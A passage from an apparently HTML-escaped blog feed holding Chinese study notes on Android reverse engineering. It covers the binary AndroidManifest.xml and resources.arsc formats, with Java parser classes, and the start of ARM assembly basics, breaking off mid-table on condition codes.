&lt;li&gt;&lt;p&gt;Uri：命名空间的URI（在字符串中的索引值），eg:&lt;code&gt;http://schemas.android.com/apk/res/android&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;strong&gt;Start Tag Chunk&lt;/strong&gt;：AndroidMaifest.xml的标签信息，最核心的内容，也是最复杂的内容。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Chunk Type：类型，固定4bytes。（0x00100102)。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Chunk Size：大小，4bytes。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Line Number ：对应AndroidMaifest中的行号，4bytes。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Unknown：未知区域,4bytes。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Namespace Uri ：命名空间的Uri，4bytes。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Name：标签名称（在字符串中的索引值），4bytes。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Flags：标签的类型，4bytes。eg：是开始标签还是结束标签？&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Attributes Counk：便签中包含的属性的个数，4bytes。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Class Attribute：标签包含的类属性，4bytes。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Attributes ：属性内容，每个属性算是一个Entry，Entry是一个大小5的字节数组[Namespace,URI,Name,ValueString,Data]，大小为”属性个数* 5 *4&amp;rdquo;个字节。&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h5 id=&#34;axmlprinter工具&#34;&gt;AXMLPrinter工具&lt;/h5&gt;

&lt;h5 id=&#34;aapt-工具&#34;&gt;aapt 工具&lt;/h5&gt;

&lt;h3 id=&#34;第六章-resourec-arsc文件格式解析&#34;&gt;第六章 resourec.arsc文件格式解析&lt;/h3&gt;

&lt;h5 id=&#34;资源文件id格式&#34;&gt;资源文件id格式&lt;/h5&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180829200453.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180829200408.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;center&gt; resourec.arsc文件格式&lt;/center&gt;&lt;/p&gt;

&lt;h5 id=&#34;数据结构&#34;&gt;数据结构&lt;/h5&gt;

&lt;p&gt;上图&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;头部信息&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;resourec.arsc文件格式由一系列chunk组成，每一个chunk均包含一个ResChunk_header&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;  public class ResChunkHeader{
      public short type;  //当前chunk的类型
      public short headerSize; //当前chunk的头部大小
      public int size;  //当前chunk的大小
      
      public int getHeaderSize(){
        return 2+2+4    
      }
      @Override
      public String toString(){
          return &amp;quot;type:&amp;quot;+Utils.bytesToHexString(
          Utils.int2Byte(type))+&amp;quot;,headerSize:&amp;quot;+headerSize+&amp;quot;,size:&amp;quot;+size;
      }
  }
  
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;资源索引表的头部信息&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;resourec.arsc的第一个结构，结构描述了Resource.arsc文件的大小和资源包数量：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   public class ResTableHeader {
    
    public ResChunkHeader header;  //就是标准的Chunk头部信息格式
    public int packageCount;  //被编译的资源包的个数
    
    public ResTableHeader(){
        header = new ResChunkHeader();
    }
    
    public int getHeaderSize(){
        return header.getHeaderSize() + 4;
    }
    
    @Override
    public String toString(){
        return &amp;quot;header:&amp;quot;+header.toString()+&amp;quot;\n&amp;quot; + &amp;quot;packageCount:&amp;quot;+packageCount;
    }
    
   }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180829204728.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;资源项的值字符串资源池&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;包含了所有在资源包里面定义的资源项的值字符串，结构如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;  public class ResStringPoolHeader {
    
    public ResChunkHeader header;  //标准的Chunk头部信息结构
    public int stringCount;  //字符串的个数
    public int styleCount;  //字符串样式的个数
    
    public final static int SORTED_FLAG = 1;
    public final static int UTF8_FLAG = (1&amp;lt;&amp;lt;8);
    
    public int flags;  //字符串的属性,可取值包括0x000(UTF-16),0x001(字符串经过排序)、0X100(UTF-8)和他们的组合值
    public int stringsStart;  //字符串内容块相对于其头部的距离
    public int stylesStart;  //字符串样式块相对于其头部的距离
    
    public ResStringPoolHeader(){
        header = new ResChunkHeader();
    }
    
    public int getHeaderSize(){
        return header.getHeaderSize() + 4 + 4 + 4 + 4 + 4;
    }
    
    @Override
    public String toString(){
        return &amp;quot;header:&amp;quot;+header.toString()+&amp;quot;\n&amp;quot; + &amp;quot;stringCount:&amp;quot;+stringCount+&amp;quot;,styleCount:&amp;quot;+styleCount+&amp;quot;,flags:&amp;quot;+flags+&amp;quot;,stringStart:&amp;quot;+stringsStart+&amp;quot;,stylesStart:&amp;quot;+stylesStart;
    }
    
  }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;接着头部的的是两个偏移数组，分别是字符串偏移数组和字符串样式偏移数组。这两个偏移数组的大小分别等于stringCount和styleCount的值，而每一个元素的类型都是无符号整型。整个字符中资源池结构如下。&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180829205108.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;字符串资源池中的字符串前两个字节为字符串长度,长度计算方法如下：&lt;/p&gt;

&lt;p&gt;&lt;code&gt;len = (((hbyte &amp;amp; 0x7F) &amp;lt;&amp;lt; 8)) | lbyte;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;如果字符串编码格式为UTF-8则字符串以0X00作为结束符,UTF-16则以0X0000作为结束符。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Package数据块&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这个数据块记录编译包的元数据，头部信息如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;  public class ResTablePackage {
    
    public ResChunkHeader header;  //Chunk的头部信息数据结构
    public int id;  //包的ID,等于Package Id,一般用户包的值Package Id为0X7F,系统资源包的Package Id为0X01；
    public char[] name = new char[128]; //包名
    public int typeStrings;  //类型字符串资源池相对头部的偏移
    public int lastPublicType;  //最后一个导出的Public类型字符串在类型字符串资源池中的索引，目前这个值设置为类型字符串资源池的元素个数。在解析的过程中没发现他的用途
    public int keyStrings;  //资源项名称字符串相对头部的偏移
    public int lastPublicKey; // 最后一个导出的Public资源项名称字符串在资源项名称字符串资源池中的索引，目前这个值设置为资源项名称字符串资源池的元素个数。在解析的过程中没发现他的用途
    
    public ResTablePackage(){
        header = new ResChunkHeader();
    }
    
    @Override
    public String toString(){
        return &amp;quot;header:&amp;quot;+header.toString()+&amp;quot;\n&amp;quot;+&amp;quot;,id=&amp;quot;+id+&amp;quot;,name:&amp;quot;+name.toString()+&amp;quot;,typeStrings:&amp;quot;+typeStrings+&amp;quot;,lastPublicType:&amp;quot;+lastPublicType+&amp;quot;,keyStrings:&amp;quot;+keyStrings+&amp;quot;,lastPublicKey:&amp;quot;+lastPublicKey;
    }
   
  }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180829205652.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;类型规范数据块&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;用来描述资源项的配置差异性。每一种类型都对应有一个类型规范数据块。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;  
  public class ResTableTypeSpec {
    
    public final static int SPEC_PUBLIC = 0x40000000;
    
    public ResChunkHeader header;  //Chunk的头部信息结构
    public byte id;  //标识资源的Type ID,Type ID是指资源的类型ID。资源的类型有animator、anim、color、drawable、layout、menu、raw、string和xml等等若干种，每一种都会被赋予一个ID。
    public byte res0;  //保留,始终为0
    public short res1;  //保留,始终为0
    public int entryCount;  //等于本类型的资源项个数,指名称相同的资源项的个数。
    
    public ResTableTypeSpec(){
        header = new ResChunkHeader();
    }
    
    @Override
    public String toString(){
        return &amp;quot;header:&amp;quot;+header.toString()+&amp;quot;,id:&amp;quot;+id+&amp;quot;,res0:&amp;quot;+res0+&amp;quot;,res1:&amp;quot;+res1+&amp;quot;,entryCount:&amp;quot;+entryCount;
    }
    
  }
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;资源类型项数据块&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;描述资源项的具体信息，名称、值、配置等信息&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;  public class ResTableType {
    
    public ResChunkHeader header;  //Chunk的头部信息结构
    
    public final static int NO_ENTRY = 0xFFFFFFFF;
    
    public byte id;  //标识资源的Type ID
    public byte res0;  //保留,始终为0
    public short res1;  //保留,始终为0
    public int entryCount;  //等于本类型的资源项个数,指名称相同的资源项的个数。
    public int entriesStart;  //等于资源项数据块相对头部的偏移值。
    
    public ResTableConfig resConfig;  //指向一个ResTable_config,用来描述配置信息,地区,语言,分辨率等
    
    public ResTableType(){
        header = new ResChunkHeader();
        resConfig = new ResTableConfig();
    }
   
    public int getSize(){
        return header.getHeaderSize() + 1 + 1 + 2 + 4 + 4;
    }
    
    @Override
    public String toString(){
        return &amp;quot;header:&amp;quot;+header.toString()+&amp;quot;,id:&amp;quot;+id+&amp;quot;,res0:&amp;quot;+res0+&amp;quot;,res1:&amp;quot;+res1+&amp;quot;,entryCount:&amp;quot;+entryCount+&amp;quot;,entriesStart:&amp;quot;+entriesStart;
    }
   
  }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ResTable_type后接着是一个大小为entryCount的uint32_t数组，每一个数组元素都用来描述一个资源项数据块的偏移位置。 紧跟在这个偏移数组后面的是一个大小为entryCount的ResTable_entry数组,每一个数组元素都用来描述一个资源项的具体信息。ResTable_entry的结构如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;  public class ResTableEntry {
    
    public final static int FLAG_COMPLEX = 0x0001;
    public final static int FLAG_PUBLIC = 0x0002;
    
    public short size;
    public short flags;
    
    public ResStringPoolRef key;
    
    public ResTableEntry(){
        key = new ResStringPoolRef();
    }
    
    public int getSize(){
        return 2+2+key.getSize();
    }
    
    @Override
    public String toString(){
        return &amp;quot;size:&amp;quot;+size+&amp;quot;,flags:&amp;quot;+flags+&amp;quot;,key:&amp;quot;+key.toString()+&amp;quot;,str:&amp;quot;+ParseResourceUtils.getKeyString(key.index);
    }
   
  }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ResTable_entry根据flags的不同,后面跟随的数据也不相同,如果flags此位为1,则ResTable_entry是ResTable_map_entry,ResTable_map_entry继承自ResTable_entry,其结构如下。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;  public class ResTableMapEntry extends ResTableEntry{
    
    public ResTableRef parent;
    public int count;
    
    public ResTableMapEntry(){
        parent = new ResTableRef();
    }
    
    @Override
    public int getSize(){
        return super.getSize() + parent.getSize() + 4;
    }
    
    @Override
    public String toString(){
        return super.toString() + &amp;quot;,parent:&amp;quot;+parent.toString()+&amp;quot;,count:&amp;quot;+count;
    }
   
  }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ResTable_map_entry其后跟随则count个ResTable_map类型的数组,ResTable_map的结构如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;  package com.wjdiankong.parseresource.type;
   
  /**
   struct ResTable_map
   {
       //bag资源项ID
       ResTable_ref name;
       //bag资源项值
       Res_value value;
   };
   * @author i
   *
   */
  public class ResTableMap {
    
    public ResTableRef name;
    public ResValue value;
    
    public ResTableMap(){
        name = new ResTableRef();
        value = new ResValue();
    }
    
    public int getSize(){
        return name.getSize() + value.getSize();
    }
    
    @Override
    public String toString(){
        return name.toString()+&amp;quot;,value:&amp;quot;+value.toString();
    }
   
  }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果flags此位为0,则ResTable_entry其后跟随的是一个Res_value,描述一个普通资源的值,Res_value结构如下。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;  public class ResValue {
    
    //dataType字段使用的常量
    public final static int TYPE_NULL = 0x00;
    public final static int TYPE_REFERENCE = 0x01;
    public final static int TYPE_ATTRIBUTE = 0x02;
    public final static int TYPE_STRING = 0x03;
    public final static int TYPE_FLOAT = 0x04;
    public final static int TYPE_DIMENSION = 0x05;
    public final static int TYPE_FRACTION = 0x06;
    public final static int TYPE_FIRST_INT = 0x10;
    public final static int TYPE_INT_DEC = 0x10;
    public final static int TYPE_INT_HEX = 0x11;
    public final static int TYPE_INT_BOOLEAN = 0x12;
    public final static int TYPE_FIRST_COLOR_INT = 0x1c;
    public final static int TYPE_INT_COLOR_ARGB8 = 0x1c;
    public final static int TYPE_INT_COLOR_RGB8 = 0x1d;
    public final static int TYPE_INT_COLOR_ARGB4 = 0x1e;
    public final static int TYPE_INT_COLOR_RGB4 = 0x1f;
    public final static int TYPE_LAST_COLOR_INT = 0x1f;
    public final static int TYPE_LAST_INT = 0x1f;
    
    public static final int
      COMPLEX_UNIT_PX           =0,
      COMPLEX_UNIT_DIP      =1,
      COMPLEX_UNIT_SP           =2,
      COMPLEX_UNIT_PT           =3,
      COMPLEX_UNIT_IN           =4,
      COMPLEX_UNIT_MM           =5,
    COMPLEX_UNIT_SHIFT      =0,
      COMPLEX_UNIT_MASK     =15,
      COMPLEX_UNIT_FRACTION =0,
      COMPLEX_UNIT_FRACTION_PARENT=1,
      COMPLEX_RADIX_23p0        =0,
      COMPLEX_RADIX_16p7        =1,
      COMPLEX_RADIX_8p15        =2,
      COMPLEX_RADIX_0p23        =3,
      COMPLEX_RADIX_SHIFT       =4,
      COMPLEX_RADIX_MASK        =3,
      COMPLEX_MANTISSA_SHIFT    =8,
      COMPLEX_MANTISSA_MASK =0xFFFFFF;
    
    
    public short size;  //ResValue的头部大小
    public byte res0;  //保留，始终为0
    public byte dataType;  //数据的类型,可以从上面的枚举类型中获取
    public int data;  //数据对应的索引
    
    public int getSize(){
        return 2 + 1 + 1 + 4;
    }
    
    public String getTypeStr(){
        switch(dataType){
            case TYPE_NULL:
                return &amp;quot;TYPE_NULL&amp;quot;;
            case TYPE_REFERENCE:
                return &amp;quot;TYPE_REFERENCE&amp;quot;;
            case TYPE_ATTRIBUTE:
                return &amp;quot;TYPE_ATTRIBUTE&amp;quot;;
            case TYPE_STRING:
                return &amp;quot;TYPE_STRING&amp;quot;;
            case TYPE_FLOAT:
                return &amp;quot;TYPE_FLOAT&amp;quot;;
            case TYPE_DIMENSION:
                return &amp;quot;TYPE_DIMENSION&amp;quot;;
            case TYPE_FRACTION:
                return &amp;quot;TYPE_FRACTION&amp;quot;;
            case TYPE_FIRST_INT:
                return &amp;quot;TYPE_FIRST_INT&amp;quot;;
            case TYPE_INT_HEX:
                return &amp;quot;TYPE_INT_HEX&amp;quot;;
            case TYPE_INT_BOOLEAN:
                return &amp;quot;TYPE_INT_BOOLEAN&amp;quot;;
            case TYPE_FIRST_COLOR_INT:
                return &amp;quot;TYPE_FIRST_COLOR_INT&amp;quot;;
            case TYPE_INT_COLOR_RGB8:
                return &amp;quot;TYPE_INT_COLOR_RGB8&amp;quot;;
            case TYPE_INT_COLOR_ARGB4:
                return &amp;quot;TYPE_INT_COLOR_ARGB4&amp;quot;;
            case TYPE_INT_COLOR_RGB4:
                return &amp;quot;TYPE_INT_COLOR_RGB4&amp;quot;;
        }
        return &amp;quot;&amp;quot;;
    }
    
    /*public String getDataStr(){
        if(dataType == TYPE_STRING){
            return ParseResourceUtils.getResString(data);
        }else if(dataType == TYPE_FIRST_COLOR_INT){
            return Utils.bytesToHexString(Utils.int2Byte(data));
        }else if(dataType == TYPE_INT_BOOLEAN){
            return data==0 ? &amp;quot;false&amp;quot; : &amp;quot;true&amp;quot;;
        }
        return data+&amp;quot;&amp;quot;;
    }*/
    
    public String getDataStr() {
        if (dataType == TYPE_STRING) {
            return ParseResourceUtils.getResString(data);
        }
        if (dataType == TYPE_ATTRIBUTE) {
            return String.format(&amp;quot;?%s%08X&amp;quot;,getPackage(data),data);
        }
        if (dataType == TYPE_REFERENCE) {
            return String.format(&amp;quot;@%s%08X&amp;quot;,getPackage(data),data);
        }
        if (dataType == TYPE_FLOAT) {
            return String.valueOf(Float.intBitsToFloat(data));
        }
        if (dataType == TYPE_INT_HEX) {
            return String.format(&amp;quot;0x%08X&amp;quot;,data);
        }
        if (dataType == TYPE_INT_BOOLEAN) {
            return data!=0?&amp;quot;true&amp;quot;:&amp;quot;false&amp;quot;;
        }
        if (dataType == TYPE_DIMENSION) {
            return Float.toString(complexToFloat(data))+
                DIMENSION_UNITS[data &amp;amp; COMPLEX_UNIT_MASK];
        }
        if (dataType == TYPE_FRACTION) {
            return Float.toString(complexToFloat(data))+
                FRACTION_UNITS[data &amp;amp; COMPLEX_UNIT_MASK];
        }
        if (dataType &amp;gt;= TYPE_FIRST_COLOR_INT &amp;amp;&amp;amp; dataType &amp;lt;= TYPE_LAST_COLOR_INT) {
            return String.format(&amp;quot;#%08X&amp;quot;,data);
        }
        if (dataType &amp;gt;= TYPE_FIRST_INT &amp;amp;&amp;amp; dataType &amp;lt;= TYPE_LAST_INT) {
            return String.valueOf(data);
        }
        return String.format(&amp;quot;&amp;lt;0x%X, type 0x%02X&amp;gt;&amp;quot;,data, dataType);
    }
    
    private static String getPackage(int id) {
        if (id&amp;gt;&amp;gt;&amp;gt;24==1) {
            return &amp;quot;android:&amp;quot;;
        }
        return &amp;quot;&amp;quot;;
    }
    
    public static float complexToFloat(int complex) {
        return (float)(complex &amp;amp; 0xFFFFFF00)*RADIX_MULTS[(complex&amp;gt;&amp;gt;4) &amp;amp; 3];
    }
    
    private static final float RADIX_MULTS[]={
        0.00390625F,3.051758E-005F,1.192093E-007F,4.656613E-010F
    };
    
    private static final String DIMENSION_UNITS[]={
        &amp;quot;px&amp;quot;,&amp;quot;dip&amp;quot;,&amp;quot;sp&amp;quot;,&amp;quot;pt&amp;quot;,&amp;quot;in&amp;quot;,&amp;quot;mm&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;
    };
    
    private static final String FRACTION_UNITS[]={
        &amp;quot;%&amp;quot;,&amp;quot;%p&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;
    };
    
    @Override
    public String toString(){
        return &amp;quot;size:&amp;quot;+size+&amp;quot;,res0:&amp;quot;+res0+&amp;quot;,dataType:&amp;quot;+getTypeStr()+&amp;quot;,data:&amp;quot;+getDataStr();
    }
   
  }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;以上代码来自于书的原作者的博客：&lt;a href=&#34;https://blog.csdn.net/jiangwei0910410003/article/details/50628894&#34;&gt;https://blog.csdn.net/jiangwei0910410003/article/details/50628894&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;博客里还有如何解析操作，留看。&lt;/p&gt;

&lt;h3 id=&#34;总结&#34;&gt;总结&lt;/h3&gt;

&lt;p&gt;这两章讲的还是挺详细的，可以留着备用查阅，这两个文件都能加以混淆来保护应用，所以还是挺重要的。&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>ARM汇编基础</title>
      <link>https://naivete.cc/post/arm%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/</link>
      <pubDate>Fri, 10 Aug 2018 19:34:10 +0800</pubDate>
      
      <guid>https://naivete.cc/post/arm%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/</guid>
      
        <description>

&lt;h2 id=&#34;arm汇编基础-简&#34;&gt;ARM汇编基础(简)&lt;/h2&gt;

&lt;p&gt;经常忘记，做个笔记，好作复习。。&lt;/p&gt;

&lt;p&gt;内容主要来源于《Android软件安全与逆向分析》和《逆向工程权威指南》以及 &lt;a href=&#34;https://www.anquanke.com/post/id/86383&#34;&gt;ARM 汇编&lt;/a&gt; 和&lt;a href=&#34;https://azeria-labs.com/writing-arm-assembly-part-1/&#34;&gt;Azeria-labs&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&#34;arm架构&#34;&gt;ARM架构&lt;/h3&gt;

&lt;p&gt;ARM属于RISC CPU，&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;ARM模式   4个字节opcode  32位&lt;/li&gt;
&lt;li&gt;Thumb模式  2个字节opcode  16位&lt;/li&gt;
&lt;li&gt;Thumb-2模式  同上（只是有部分4个字节的opcode)&lt;/li&gt;
&lt;li&gt;64位ARM  4个字节opcode&lt;/li&gt;
&lt;li&gt;ARM机器码在版本3之前是小端。但是之后默认采用大端格式，但可以设置切换到小端。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180810112415.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;数据类型&#34;&gt;数据类型&lt;/h3&gt;

&lt;p&gt;数据类型在汇编语言中的扩展后缀为&lt;strong&gt;-h&lt;/strong&gt;或者&lt;strong&gt;-sh&lt;/strong&gt;对应着半字，&lt;strong&gt;-b&lt;/strong&gt;或者&lt;strong&gt;-sb&lt;/strong&gt;对应着字节，但是对于字并没有对应的扩展&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180810113108.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;ldr = 加载字，宽度四字节
ldrh = 加载无符号的半字，宽度两字节
ldrsh = 加载有符号的半字，宽度两字节
ldrb = 加载无符号的字节
ldrsb = 加载有符号的字节
str = 存储字，宽度四字节
strh = 存储无符号的半字，宽度两字节
strsh = 存储有符号的半字，宽度两字节
strb = 存储无符号的字节
strsb = 存储有符号的字节
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;字节序&#34;&gt;字节序&lt;/h3&gt;

&lt;p&gt;在内存中有两种字节排布顺序，大端序(BE)或者小端序(LE)。两者的主要不同是对象中的每个字节在内存中的存储顺序存在差异。一般X86中是小端序，最低的字节存储在最低的地址上。在大端机中最高的字节存储在最低的地址上。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://p0.ssl.qhimg.com/t01b6d7f41b02b0a58d.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;数据访问时采取大端序还是小端序使用程序状态寄存器(CPSR)的第9比特位来决定的。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180810120701.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;寄存器&#34;&gt;寄存器&lt;/h3&gt;

&lt;p&gt;37个32位寄存器，其中31个为基础寄存器，6个为状态寄存器。&lt;/p&gt;

&lt;p&gt;用户模式下有&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;不分组寄存器（R0-R7） R7一般存放系统调用号&lt;/li&gt;
&lt;li&gt;分组寄存器（R8-R14）&lt;/li&gt;
&lt;li&gt;程序计数器（R15）&lt;/li&gt;
&lt;li&gt;单前程序状态寄存器（CPSR）&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;两种状态：&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;center&#34;&gt;ARM状态（32位对齐）&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;Thumb状态(16位对齐)&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;R0-R7&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;R0-R7(相同)&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;CPSR&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;CPSR（同）&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;R11&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;FP（栈帧指针）&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;R12&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;IP（内部程序调用）&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;R13&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;SP（栈指针）&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;R14&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;LR（链接寄存器）一般存放函数返回地址&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;R15&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;PC（程序计数器）&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;和x86对比：&lt;img src=&#34;https://p5.ssl.qhimg.com/t01a8e5d24fa91f9f0f.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;CSPR:&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180810122226.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;32位的CPSR寄存器的比特位含义，左边是最大比特位，右边是最小比特位。每个单元代表一个比特。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180810122258.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;条件码&lt;/th&gt;
&lt;th&gt;助记符后缀&lt;/th&gt;
&lt;th&gt;标志&lt;/th&gt;
&lt;th&gt;含义&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;0000&lt;/td&gt;
&lt;td&gt;EQ&lt;/td&gt;
&lt;td&gt;Z置位&lt;/td&gt;
&lt;td&gt;相等&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;0001&lt;/td&gt;
&lt;td&gt;NE&lt;/td&gt;
&lt;td&gt;Z清零&lt;/td&gt;
&lt;td&gt;不相等&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;0010&lt;/td&gt;
&lt;td&gt;CS&lt;/td&gt;
&lt;td&gt;C置位&lt;/td&gt;
&lt;td&gt;无符号数大于或等于&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;0011&lt;/td&gt;
&lt;td&gt;CC&lt;/td&gt;
&lt;td&gt;C清零&lt;/td&gt;
&lt;td&gt;无符号数小于&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;0100&lt;/td&gt;
&lt;td&gt;MI&lt;/td&gt;
&lt;td&gt;N置位&lt;/td&gt;
&lt;td&gt;负数&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;0101&lt;/td&gt;
&lt;td&gt;PL&lt;/td&gt;
&lt;td&gt;N清零&lt;/td&gt;
&lt;td&gt;正数或零&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;0110&lt;/td&gt;
&lt;td&gt;VS&lt;/td&gt;
&lt;td&gt;V置位&lt;/td&gt;
&lt;td&gt;溢出&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;0111&lt;/td&gt;
&lt;td&gt;VC&lt;/td&gt;
&lt;td&gt;V清零&lt;/td&gt;
&lt;td&gt;未溢出&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;1000&lt;/td&gt;
&lt;td&gt;HI&lt;/td&gt;
&lt;td&gt;C置位Z清零&lt;/td&gt;
&lt;td&gt;无符号数大于&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;1001&lt;/td&gt;
&lt;td&gt;LS&lt;/td&gt;
&lt;td&gt;C清零Z置位&lt;/td&gt;
&lt;td&gt;无符号数小于或等于&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;1010&lt;/td&gt;
&lt;td&gt;GE&lt;/td&gt;
